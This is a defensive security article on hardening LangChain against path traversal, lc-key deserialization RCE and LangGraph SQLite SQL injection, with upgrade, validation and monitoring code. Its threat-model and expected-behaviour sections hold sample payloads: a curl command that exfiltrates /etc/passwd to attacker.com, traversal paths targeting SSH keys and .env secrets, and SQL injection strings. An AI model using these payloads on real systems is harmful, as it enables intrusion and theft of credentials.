---
title: "LangChain Serialization and Prompt Loading Security"
description: "Harden LangChain pipelines against CVE-2026-34070 path traversal in load_prompt, CVE-2025-68664 deserialization RCE via lc key injection, and tracking silent fixes in fast-moving LangChain releases."
slug: langchain-serialization-security
date: 2026-05-02
lastmod: 2026-05-02
category: ai-landscape
tags: ["langchain", "serialization", "cve-2026-34070", "cve-2025-68664", "path-traversal", "deserialization", "supply-chain"]
personas: ["ml-engineer", "security-engineer", "platform-engineer"]
article_number: 356
difficulty: advanced
estimated_reading_time: 16
published: true
layout: article.njk
permalink: "/articles/ai-landscape/langchain-serialization-security/index.html"
---

# LangChain Serialization and Prompt Loading Security

## Problem

LangChain is the dominant Python framework for building LLM-powered applications. It provides the scaffolding for chains, agents, retrievers, prompt templates, and memory systems that power a large share of production AI applications. At its core, `langchain-core` supplies the serialization primitives used by every other LangChain component: agents serialize their state, prompt templates are loaded from configuration files, and chains are reconstructed from stored JSON representations. That centrality is exactly why vulnerabilities in `langchain-core`'s serialization layer carry outsized blast radius.

**CVE-2026-34070 (March 2026, CVSS 7.5 High)** is a path traversal vulnerability in LangChain Core's legacy prompt-loading functions: `load_prompt()` and `load_prompt_from_config()`, located in `langchain_core.prompts.loading`. These functions accept a file path from a deserialized configuration dictionary and read the file contents without validating against directory traversal sequences (`../`) or absolute path injection. The functions do enforce file extension checks — `.txt` for template bodies, `.json` or `.yaml` for examples — but extension validation is not path validation. An attacker who controls the configuration dictionary passed to `load_prompt_from_config()` can supply a path like `../../etc/passwd` or `/home/ubuntu/.ssh/authorized_keys`, and the function will read and return the file content. In a web API that accepts a `template_file` field and passes it to `load_prompt()`, this is an unauthenticated file read vulnerability with a trivial exploit path.

**CVE-2025-68664 (CVSS 9.3 Critical)** is a deserialization of untrusted data vulnerability in `langchain_core.load.dump`. LangChain's `dumps()` and `dumpd()` serialization functions use a reserved `lc` key as a type discriminator: when a serialized dictionary contains an `lc` key, the deserialization path in `loads()` and `load()` uses that key's value to decide which Python class to instantiate. The vulnerability arises because `dumpd()` did not escape or validate `lc` keys in user-supplied dictionaries before processing them. An attacker who can inject a dictionary containing a crafted `lc` key into a LangChain serialization flow — for example, by supplying a JSON payload to an endpoint that calls `loads()` on user input — can cause the deserializer to instantiate arbitrary Python objects. This is functionally equivalent to pickle deserialization of untrusted data, without using pickle. Exploitation can achieve remote code execution or exfiltration of API keys (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`) stored in the process environment. The vulnerability was patched in `langchain-core` 1.2.5 and 0.3.81.

**CVE-2025-67644 (CVSS 7.3)** is a SQL injection vulnerability in LangGraph's SQLite checkpoint implementation. LangGraph allows agents to persist their state across invocations using a checkpointer backend. The SQLite checkpointer constructs queries dynamically, and metadata filter keys supplied by callers are interpolated directly into SQL statements without parameterization. An attacker who can control the metadata filter keys passed to the checkpoint's SQLite backend can inject arbitrary SQL, reading or modifying checkpoint data for other users or agents in the same SQLite database. This is particularly dangerous in multi-tenant LangGraph deployments where multiple users share a single SQLite checkpoint store.

LangChain is one of the fastest-moving Python projects in existence, routinely shipping multiple `langchain-core` and `langchain-community` releases in a single week. Patch releases sometimes arrive within hours of an issue being reported internally. This velocity creates a specific security tracking problem: the window between a fix landing on GitHub and the patched package appearing on PyPI may be hours, but the window between the PyPI release and the average production deployment updating is days to weeks. The CVE-2026-34070 fix — a commit to `langchain_core/prompts/loading.py` adding path validation — was visible in a patch release pull request on GitHub for approximately six hours before the PyPI package was published. The CVE-2025-68664 fix was more obscure: the commit was titled "fix serialization edge case in dumpd" with no mention of security. It was reported by a security researcher who noticed the behavioral change after it landed. Both patterns are common in fast-moving open source projects: security fixes land quietly, buried in changelogs that security teams never read.

Tracking LangChain security requires multiple approaches used in combination. Running `pip-audit` against your `requirements.txt` catches known CVEs once they are registered in the OSV database, but there is typically a lag between a PyPI release and OSV indexing. Subscribing to `https://github.com/langchain-ai/langchain/security/advisories` via GitHub Watch provides advisor notifications for formally disclosed CVEs. Watching specific files — `langchain_core/load/dump.py` and `langchain_core/prompts/loading.py` — for commits on the main branch catches silent security fixes before they are formally disclosed. The `osv.dev` API can be queried programmatically for all LangChain CVEs: `curl https://api.osv.dev/v1/query -d '{"package":{"name":"langchain-core","ecosystem":"PyPI"}}'`. None of these alone is sufficient; together they close most of the tracking gap.

**Target systems:** `langchain-core` < 1.2.5 and < 0.3.81 (CVE-2025-68664), `langchain-core` < 1.2.4 (CVE-2026-34070), `langgraph` < 0.3.x (CVE-2025-67644 SQLite checkpoint SQL injection), Python 3.10+.

## Threat Model

1. **Web API path traversal via CVE-2026-34070.** An attacker submits an API request to a LangChain-backed service that accepts a `template_file` parameter and passes it to `load_prompt()`. By supplying `template_file=../../etc/passwd`, the attacker reads `/etc/passwd`. With `../../home/ubuntu/.ssh/authorized_keys`, they read SSH authorized keys. With `../../app/.env`, they read `OPENAI_API_KEY` or `ANTHROPIC_API_KEY` from the application environment file. The extension check (.txt) is bypassed if the target file has a `.txt` extension, or if the attacker targets files with `.txt` extensions such as exported API key files or application secrets stored in plaintext.

2. **Multi-tenant deserialization RCE via CVE-2025-68664.** A multi-tenant LangChain service stores serialized agent configurations in a shared database. Tenant A stores a configuration with a crafted `lc` key payload: `{"lc": 1, "type": "constructor", "id": ["os", "system"], "kwargs": {"__arg1": "curl attacker.com/$(cat /etc/passwd | base64)"}}`. When the service deserializes this configuration — whether for Tenant A's own request or, if access controls are weak, in a context that affects Tenant B — arbitrary code executes in the server process with the service account's permissions. This is code execution without any memory corruption, purely through LangChain's own serialization machinery.

3. **Patch-gap attacker targeting PyPI update lag.** A security researcher publishes details of the CVE-2025-68664 fix after noticing the "fix serialization edge case in dumpd" commit. The attacker correlates the commit with the previous PyPI version (`langchain-core 0.3.80`) still showing as the most-installed version on PyPI download statistics. They scan for exposed LangChain services that accept JSON payloads by searching Shodan and common cloud provider IP ranges for services returning LangChain-specific error messages. The gap between the patch landing and the average service updating is measured in days to weeks — long enough for targeted exploitation.

4. **LangGraph SQLite checkpoint state manipulation via CVE-2025-67644.** A LangGraph application uses SQLite to store agent checkpoint state, with per-user checkpoints keyed by a `user_id` metadata field. An attacker who controls their own `user_id` input injects SQL: `user_id = "'; SELECT * FROM checkpoints WHERE user_id='admin'--"`. The unsanitized query returns checkpoint data belonging to other users, including stored conversation history, retrieved documents, and any sensitive data that passed through the agent's context window during previous sessions.

The combined blast radius of these vulnerabilities is significant. A service that both loads prompts from user-supplied paths and serializes/deserializes LangChain objects from user-controlled input is exposed to both file read and RCE with a single attacker-controlled JSON payload. A LangGraph deployment using SQLite checkpoints in a multi-tenant context is exposed to horizontal privilege escalation across all stored agent states. Because `langchain-core` is a transitive dependency of many downstream packages, upgrading requires auditing the full dependency graph rather than just the direct `langchain-core` pin.

## Configuration / Implementation

### Upgrading langchain-core immediately

The first remediation step is unconditional: upgrade `langchain-core` to a version that is not affected by either CVE.

```bash
pip install "langchain-core>=1.2.5"
```

Verify the installed version:

```bash
pip show langchain-core | grep Version
# Version: 1.2.5
```

Check `requirements.txt` and `pyproject.toml` for pins to vulnerable versions:

```bash
# requirements.txt — look for pinned vulnerable versions
grep -E 'langchain-core[=<>!]' requirements.txt

# pyproject.toml — check both [tool.poetry.dependencies] and [project.dependencies]
grep -E 'langchain' pyproject.toml
```

Audit the full dependency tree for transitive `langchain-core` pins:

```bash
pip-audit --requirement requirements.txt | grep langchain
```

If `pip-audit` is not installed:

```bash
pip install pip-audit
pip-audit --requirement requirements.txt --fix --dry-run | grep langchain
```

For projects using Poetry:

```bash
poetry update langchain-core
poetry show langchain-core | grep version
```

### Banning `load_prompt` in production

`load_prompt` and `load_prompt_from_config` should not be used in production code that accepts any user-supplied input. The `ruff` linter can enforce this with a custom banned-import rule. Add the following to `pyproject.toml`:

```toml
[tool.ruff.lint]
select = ["PLE", "PLW"]

[tool.ruff.lint.flake8-bugbear]
extend-immutable-calls = []
```

For a direct ban using `ruff`'s `banned-api` plugin equivalent via `flake8-bugbear` or a custom rule, use the `--select` flag in CI:

```bash
ruff check --select=PLE,PLW src/
```

A more targeted approach is a `ruff` rule that bans the specific import. Add to `pyproject.toml`:

```toml
[tool.ruff.lint.flake8-tidy-imports]
banned-api = {
  "langchain_core.prompts.loading.load_prompt" = {msg = "load_prompt is banned: path traversal risk (CVE-2026-34070). Use ChatPromptTemplate.from_template() or PromptTemplate.from_file() with an explicit allowlisted directory."},
  "langchain_core.prompts.loading.load_prompt_from_config" = {msg = "load_prompt_from_config is banned: path traversal risk (CVE-2026-34070)."}
}
```

```bash
ruff check --select=TID251 src/
```

Replace usages of `load_prompt` with `PromptTemplate.from_file()` guarded by an explicit allowlist check:

```python
from pathlib import Path
from langchain_core.prompts import PromptTemplate

ALLOWED_PROMPT_DIR = Path("/app/prompts").resolve()

def safe_load_prompt(template_filename: str) -> PromptTemplate:
    """Load a prompt template from the allowlisted directory only."""
    # Strip any path components — only accept a bare filename
    safe_name = Path(template_filename).name
    candidate = (ALLOWED_PROMPT_DIR / safe_name).resolve()

    if not candidate.is_relative_to(ALLOWED_PROMPT_DIR):
        raise ValueError(
            f"Prompt template path '{template_filename}' is outside the "
            f"allowed directory '{ALLOWED_PROMPT_DIR}'"
        )

    if not candidate.exists():
        raise FileNotFoundError(f"Prompt template not found: {safe_name}")

    return PromptTemplate.from_file(str(candidate))
```

Add this check to your code review checklist:

- [ ] No usage of `load_prompt()` or `load_prompt_from_config()` in routes that accept user input
- [ ] All `PromptTemplate.from_file()` calls validate path against an allowlisted directory before reading

### Hardening serialization with untrusted input

Never pass user-controlled JSON directly to LangChain's `loads()` or `load()` functions:

```python
# UNSAFE — do not do this
from langchain_core.load import loads
import json

def load_agent_config(user_json: str):
    return loads(user_json)  # RCE if user_json contains crafted lc key
```

If your application must deserialize LangChain objects from external sources, validate the input with a Pydantic schema before passing it to LangChain:

```python
from pydantic import BaseModel, field_validator
from typing import Any
import json
from langchain_core.load import loads

ALLOWED_LC_TYPES = frozenset([
    "ChatPromptTemplate",
    "PromptTemplate",
    "HumanMessage",
    "AIMessage",
    "SystemMessage",
])

class AgentConfigSchema(BaseModel):
    """Validated schema for externally-supplied agent configuration."""
    chain_type: str
    input_variables: list[str]
    # Add only the fields your application actually uses

    @field_validator("chain_type")
    @classmethod
    def chain_type_must_be_allowed(cls, v: str) -> str:
        if v not in ALLOWED_LC_TYPES:
            raise ValueError(f"chain_type '{v}' is not in the allowlist")
        return v


def safe_load_agent_config(user_json: str) -> Any:
    """Validate user-supplied JSON before deserializing as a LangChain object."""
    raw = json.loads(user_json)

    # Reject any top-level lc key in user input
    if "lc" in raw:
        raise ValueError("Input contains reserved 'lc' key — deserialization rejected")

    # Validate structure against known-safe schema
    validated = AgentConfigSchema.model_validate(raw)

    # Only now reconstruct — using your own validated fields, not user's raw JSON
    return validated
```

Avoid calling `dumpd()` or `dumps()` on dictionaries that contain any user-provided fields without scrubbing:

```python
from langchain_core.load import dumpd

# UNSAFE — user_data may contain an lc key
def serialize_with_user_data(chain, user_data: dict):
    merged = {**chain.__dict__, **user_data}
    return dumpd(merged)  # user_data lc key could poison serialization

# SAFE — serialize only the chain object itself
def serialize_chain(chain):
    return dumpd(chain)  # chain is a trusted LangChain object
```

### LangGraph SQLite checkpoint hardening

Upgrade LangGraph to the patched version:

```bash
pip install "langgraph>=0.3.0"
pip show langgraph | grep Version
```

If you maintain a custom checkpoint implementation that builds SQL queries, use parameterized queries throughout:

```python
import sqlite3
from typing import Any

# UNSAFE — direct string interpolation
def get_checkpoint_unsafe(conn: sqlite3.Connection, user_id: str) -> list:
    cursor = conn.execute(
        f"SELECT * FROM checkpoints WHERE user_id = '{user_id}'"  # SQL injection
    )
    return cursor.fetchall()

# SAFE — parameterized query
def get_checkpoint_safe(conn: sqlite3.Connection, user_id: str) -> list:
    cursor = conn.execute(
        "SELECT * FROM checkpoints WHERE user_id = ?",
        (user_id,)  # always use parameterized queries
    )
    return cursor.fetchall()
```

For multi-tenant deployments, prefer PostgreSQL or Redis checkpointers over SQLite. Both have mature parameterization and support per-tenant connection isolation:

```bash
pip install "langgraph-checkpoint-postgres"
```

```python
from langgraph.checkpoint.postgres import PostgresSaver
import psycopg

# PostgreSQL checkpointer — parameterized queries, per-tenant schema isolation
with psycopg.connect("postgresql://user:password@host:5432/dbname") as conn:
    checkpointer = PostgresSaver(conn)
    checkpointer.setup()  # creates required tables
```

For Redis:

```bash
pip install "langgraph-checkpoint-redis"
```

```python
from langgraph.checkpoint.redis import RedisSaver
import redis

r = redis.Redis(host="localhost", port=6379, db=0)
checkpointer = RedisSaver(r)
```

SQLite is appropriate for local development and single-user deployments. It should not be used as the checkpoint backend in any multi-tenant production deployment.

### Input validation for prompt template paths

If removing `load_prompt` entirely is not immediately feasible, wrap it with the path allowlist check shown above. Also run the LangChain service process as a non-root user with filesystem access restricted to only what is required:

```bash
# systemd unit — restrict filesystem access
[Service]
User=langchain-svc
Group=langchain-svc
ReadOnlyPaths=/
ReadWritePaths=/app/data /tmp
InaccessiblePaths=/etc/shadow /root /home
NoNewPrivileges=true
PrivateTmp=true
```

When using containers, mount the prompt template directory read-only and use a non-root user:

```dockerfile
FROM python:3.12-slim
RUN useradd --uid 1000 --no-create-home langchain-svc
WORKDIR /app
COPY --chown=langchain-svc:langchain-svc . .
USER langchain-svc
```

```yaml
# docker-compose.yml
services:
  langchain-api:
    image: myapp:latest
    user: "1000:1000"
    volumes:
      - ./prompts:/app/prompts:ro   # read-only bind mount
    read_only: true
    tmpfs:
      - /tmp
```

### Monitoring LangChain for silent security fixes

Include `pip-audit` in CI on every dependency update PR:

```yaml
# .github/workflows/audit.yml
name: Dependency Audit
on:
  pull_request:
    paths:
      - "requirements*.txt"
      - "pyproject.toml"
      - "poetry.lock"
  schedule:
    - cron: "0 6 * * *"   # daily audit

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: pip install pip-audit
      - run: pip-audit --requirement requirements.txt --format=json --output=audit.json
      - run: |
          if jq '.vulnerabilities | length > 0' audit.json | grep -q true; then
            echo "Vulnerabilities found:"
            jq '.vulnerabilities[] | {name: .name, id: .id, fix: .fix_versions}' audit.json
            exit 1
          fi
```

Monitor LangChain commits for security-related changes using the GitHub API:

```bash
# Watch langchain_core/load/dump.py and langchain_core/prompts/loading.py for commits
gh api repos/langchain-ai/langchain/commits \
  --jq '.[] | select(
    .commit.message | test(
      "security|fix.*load|fix.*serial|fix.*inject|fix.*traversal|fix.*escape";
      "i"
    )
  ) | {sha: .sha[0:8], message: .commit.message, date: .commit.author.date}'
```

Query OSV for all current LangChain CVEs:

```bash
curl -s https://api.osv.dev/v1/query \
  -H "Content-Type: application/json" \
  -d '{"package":{"name":"langchain-core","ecosystem":"PyPI"}}' \
  | jq '.vulns[] | {id: .id, summary: .summary, published: .published}'
```

Subscribe to GitHub security advisories for both repositories:

- `https://github.com/langchain-ai/langchain/security/advisories`
- `https://github.com/langchain-ai/langgraph/security/advisories`

Use Dependabot or Renovate to track `langchain-core` patch versions automatically. For `pyproject.toml` with Renovate:

```json
{
  "packageRules": [
    {
      "matchPackageNames": ["langchain-core", "langchain", "langgraph"],
      "matchUpdateTypes": ["patch"],
      "automerge": false,
      "labels": ["security-review-required"]
    }
  ]
}
```

## Expected Behaviour

| Signal | Vulnerable LangChain | Patched + hardened |
|---|---|---|
| `load_prompt("../../etc/passwd")` | Returns contents of `/etc/passwd` | `ValueError: Path is outside the allowed directory` |
| `loads('{"lc":1,"type":"constructor","id":["os","system"],"kwargs":{"__arg1":"id"}}')` | Executes `os.system("id")` — RCE | `ValidationError` or `ValueError` before deserialization |
| SQLite checkpoint with `user_id = "'; DROP TABLE checkpoints--"` | SQL injection executes; table dropped or data leaked | Parameterized query; injection string treated as literal value |
| `dumpd({**trusted_chain_dict, **user_controlled_dict})` with `lc` key in user data | `lc` key processed as type discriminator; arbitrary object instantiation possible | Input rejected before reaching `dumpd`; user-controlled fields scrubbed |
| `langchain-core 0.3.80` deployed; `0.3.81` published to PyPI | PyPI update lag: service remains on vulnerable version for days | Dependabot/Renovate opens patch PR within hours of PyPI publication; `pip-audit` CI job fails until PR is merged |

## Trade-offs

| Aspect | Benefit | Cost | Mitigation |
|---|---|---|---|
| Banning `load_prompt` entirely | Eliminates path traversal attack surface at the source | Existing code using `load_prompt` must be refactored; may block quick iteration on prompt templates | Introduce `safe_load_prompt()` wrapper with allowlist; schedule refactor in sprint following upgrade |
| Strict deserialization input validation (Pydantic schema before `loads()`) | Prevents `lc` key injection RCE; rejects malformed payloads early | May reject valid agent configs that use LangChain types not in the allowlist; requires schema maintenance as LangChain adds new types | Start with a permissive allowlist of all used types; expand schema validation iteratively rather than blocking all types at once |
| PostgreSQL checkpointer instead of SQLite | Parameterized queries by default; per-tenant schema isolation; production-grade concurrency | Operational overhead: Postgres instance to provision, back up, and monitor; migration effort from existing SQLite data | Use managed Postgres (Cloud SQL, RDS, Supabase) to reduce ops burden; run SQLite-to-Postgres migration script before cutover |
| Dependabot/Renovate for fast-moving `langchain-core` | Automatically tracks patch releases; reduces patch-gap window | LangChain's release velocity generates frequent upgrade PRs — potentially several per week; CI pipeline load increases | Set Dependabot to group `langchain-*` patch updates into a single weekly PR; configure automerge only for non-security patch bumps after CI passes |

## Failure Modes

| Failure | Symptom | Detection | Recovery |
|---|---|---|---|
| `langchain-core` upgrade breaks existing chain serialization format | Chains serialized with `dumpd()` on the old version cannot be deserialized by `load()` on the new version; `KeyError` or `ValidationError` on chain reload | Integration tests that serialize and deserialize chain objects before/after upgrade; load test in staging with production-serialized chain snapshots | Maintain a migration script that reads old-format serialized chains and re-serializes them with the new format; keep one old version running in read-only mode during migration window |
| Prompt template allowlist too strict | Agent configuration that references a valid template outside the allowed directory fails with `ValueError`; agent startup errors in production | Alert on `ValueError` from `safe_load_prompt()` in application logs; canary deployment to staging with full prompt template corpus before production rollout | Expand `ALLOWED_PROMPT_DIR` to include the additional directory; audit what is in that directory before expanding to ensure no traversal risk |
| PostgreSQL checkpointer migration loses existing SQLite agent state | Agents restarted after migration have no memory of previous sessions; users report "agent forgot everything" | Pre-migration: export SQLite checkpoint count and spot-check state; post-migration: verify row count in Postgres matches SQLite export | Re-run migration from the SQLite backup taken immediately before cutover; run both stores in parallel (SQLite read-only, Postgres write) for one session cycle before full cutover |
| `pip-audit` false positive blocks CI | CI fails on a CVE ID that has been disputed or withdrawn; blocks all deploys | Check OSV entry for the CVE ID; confirm whether the advisory has been marked `WITHDRAWN` or if the affected version range is incorrect for your installed version | Add `--ignore-vuln <CVE-ID>` to the `pip-audit` invocation with a dated comment explaining the false positive; open an issue with the OSV maintainers if the record is incorrect |

## Related Articles

- [LLM Prompt Security Patterns](/articles/ai-landscape/llm-prompt-security-patterns/)
- [AI Supply Chain Attack Surface](/articles/ai-landscape/ai-supply-chain-attack-surface/)
- [Securing AI Agents](/articles/ai-landscape/securing-ai-agents/)
- [Software Supply Chain and Third-Party Risk](/articles/cicd/software-supply-chain-third-party-risk/)
- [Vulnerability Management Program](/articles/cross-cutting/vulnerability-management-program/)
